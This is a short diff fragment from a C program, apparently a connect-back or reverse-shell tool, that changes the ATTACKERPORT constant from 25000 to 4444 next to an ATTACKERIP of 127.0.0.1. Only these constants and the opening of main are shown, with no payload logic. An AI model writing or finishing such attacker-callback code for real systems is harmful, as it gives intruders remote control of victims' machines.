@@ -19,7 +19,7 @@ typedef int SOCKETTYPE;
 #endif
 
 const char* ATTACKERIP = "127.0.0.1";
-const int ATTACKERPORT = 25000;
+const int ATTACKERPORT = 4444;
 
 int main() {
 #if defined(_WIN32) || defined(WIN32)
